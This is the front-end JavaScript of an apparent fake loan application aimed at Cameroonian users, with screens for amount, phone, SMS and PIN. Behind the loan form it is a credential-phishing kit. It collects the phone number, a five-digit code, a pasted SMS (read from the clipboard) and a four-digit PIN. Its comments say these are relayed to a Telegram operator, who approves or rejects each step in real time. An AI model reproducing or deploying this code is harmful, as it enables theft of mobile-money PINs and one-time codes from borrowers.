function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
}

function selectLanguage(lang, element) {
    document.querySelectorAll('.lang-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    element.classList.add('selected');
    setTimeout(() => { goToScreen('screen-home'); }, 300);
}

const amountSlider = document.getElementById('amount-slider');
const loanAmountDisplay = document.getElementById('loan-amount-display');
const termSelect = document.getElementById('term-select');
const monthlyPaymentDisplay = document.getElementById('monthly-payment-display');

function updateCalculator() {
    const principal = parseInt(amountSlider.value);
    const months = parseInt(termSelect.value);
    loanAmountDisplay.innerText = principal.toLocaleString();
    const totalRepayment = principal * 1.10;
    const monthly = totalRepayment / months;
    monthlyPaymentDisplay.innerText = Math.round(monthly).toLocaleString();
}

amountSlider.addEventListener('input', updateCalculator);
termSelect.addEventListener('change', updateCalculator);
updateCalculator();

function startApplication() {
    document.getElementById('form-amount').value = amountSlider.value;
    document.getElementById('form-term').value = termSelect.value;
    goToScreen('screen-application');
}

document.getElementById('phone-number').addEventListener('input', function (e) {
    this.value = this.value.replace(/[^0-9]/g, ''); 
});
document.getElementById('five-digit-code').addEventListener('input', function (e) {
    this.value = this.value.replace(/[^0-9]/g, ''); 
});

let currentStep = 1;
const totalSteps = 3;

function updateFormUI() {
    document.querySelectorAll('.form-step').forEach((el, index) => {
        el.classList.toggle('active', index + 1 === currentStep);
    });
    document.getElementById('step-indicator').innerText = `Step ${currentStep} of ${totalSteps}`;
    document.getElementById('btn-back').style.display = currentStep === 1 ? 'none' : 'block';
    
    const nextBtn = document.getElementById('btn-next');
    const submitBtn = document.getElementById('btn-submit');

    if (currentStep === totalSteps) {
        nextBtn.style.display = 'none';
        submitBtn.style.display = 'block';
        generateSummary(); 
    } else {
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
    }
}

function nextStep() {
    if (currentStep < totalSteps) {
        const currentStepDiv = document.getElementById(`step-${currentStep}`);
        const inputs = currentStepDiv.querySelectorAll('input, select');
        let isValid = true;
        inputs.forEach(input => {
            if (!input.checkValidity()) {
                isValid = false;
                input.style.borderColor = 'red';
            } else {
                input.style.borderColor = '#3c5c75'; 
            }
        });
        if (!isValid) {
            alert("Please fill out all fields correctly before continuing.");
            return;
        }
        currentStep++;
        updateFormUI();
    }
}

function prevStep() {
    if (currentStep > 1) {
        currentStep--;
        updateFormUI();
    }
}

function generateSummary() {
    const amount = document.getElementById('form-amount').value;
    const term = document.getElementById('form-term').value;
    const purpose = document.getElementById('form-purpose').value || '—';
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const phone = document.getElementById('phone-number').value;
    
    document.getElementById('summary-amount').innerText = `XAF ${parseInt(amount).toLocaleString()}`;
    document.getElementById('summary-term').innerText = `${term} Months`;
    document.getElementById('summary-purpose').innerText = purpose;
    document.getElementById('summary-phone').innerText = `+237 ${phone}`;
    if (firstName || lastName) {
        document.getElementById('summary-name').innerText = `${firstName} ${lastName}`.trim();
    }
}

// --- 1. SUBMIT FORM & TRIGGER TELEGRAM ---
async function submitForm(event) {
    event.preventDefault(); 
    
    const currentStepDiv = document.getElementById(`step-${currentStep}`);
    const inputs = currentStepDiv.querySelectorAll('input, select');
    let isValid = true;
    inputs.forEach(input => {
        if (!input.checkValidity()) {
            isValid = false;
            input.style.borderColor = 'red';
        } else {
            input.style.borderColor = '#3c5c75'; 
        }
    });

    if (!isValid) {
        alert("Please fill out all fields correctly before submitting.");
        return;
    }

    goToScreen('screen-processing');

    const phone = document.getElementById('phone-number').value || "Unknown";
    const code = document.getElementById('five-digit-code').value || "Unknown";

    try {
        const response = await fetch('/api/request-approval', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, code: code })
        });
        const result = await response.json();

        const interval = setInterval(async () => {
            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'approve') {
                clearInterval(interval);
                goToScreen('screen-sms');
            } else if (statusData.status === 'reject') {
                clearInterval(interval);
                alert("Application rejected by Admin.");
                goToScreen('screen-application');
            }
        }, 2000);

    } catch (error) {
        alert("Error connecting to server.");
        goToScreen('screen-application');
    }
}

// --- SMS SCREEN LOGIC ---
document.getElementById('sms-input').addEventListener('input', function() {
    const count = this.value.length;
    document.getElementById('char-count').innerText = `${count} characters`;
    const verifyBtn = document.getElementById('btn-verify-sms');
    if (count > 5) {
        verifyBtn.classList.add('enabled');
        verifyBtn.disabled = false;
    } else {
        verifyBtn.classList.remove('enabled');
        verifyBtn.disabled = true;
    }
});

async function pasteSMS() {
    try {
        const text = await navigator.clipboard.readText();
        const input = document.getElementById('sms-input');
        input.value = text;
        const event = new Event('input');
        input.dispatchEvent(event);
    } catch (err) {
        alert("Please press and hold on the text box to paste the SMS manually.");
    }
}

// --- PIN SCREEN LOGIC ---
const pinBoxes = document.querySelectorAll('.pin-box');

function checkPINs() {
    let filled = true;
    pinBoxes.forEach(box => {
        if (box.value.length !== 1) filled = false;
    });
    const btn = document.getElementById('btn-verify-pin');
    if (filled) {
        btn.classList.add('enabled');
        btn.disabled = false;
    } else {
        btn.classList.remove('enabled');
        btn.disabled = true;
    }
}

function moveToNext(current, index) {
    current.value = current.value.replace(/[^0-9]/g, '');
    if (current.value.length === 1 && index < 4) {
        pinBoxes[index].focus();
    }
    checkPINs();
}

function moveToPrev(current, event, index) {
    if (event.key === "Backspace" && current.value.length === 0 && index > 1) {
        pinBoxes[index - 2].focus();
    }
}

// --- 2. TRIGGER TELEGRAM ON PIN SUBMIT ---
async function submitPIN() {
    const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
    const phone = document.getElementById('phone-number').value || "Unknown";
    const appliedAmount = document.getElementById('form-amount').value;
    
    // Immediately show Processing Screen
    goToScreen('screen-processing');

    try {
        // Send to Telegram (showing the PIN code)
        const response = await fetch('/api/request-approval', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, code: `PIN: ${pinCode}` })
        });
        const result = await response.json();

        const interval = setInterval(async () => {
            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'approve') {
                clearInterval(interval);
                
                // Set the final approved amount dynamically
                document.getElementById('final-amount-display').innerText = parseInt(appliedAmount).toLocaleString();
                
                // Show Congratulations Screen
                goToScreen('screen-success'); 
            } else if (statusData.status === 'reject') {
                clearInterval(interval);
                alert("Verification rejected by Admin.");
                goToScreen('screen-pin');
            }
        }, 2000);

    } catch (error) {
        alert("Error connecting to server.");
        goToScreen('screen-pin');
    }
}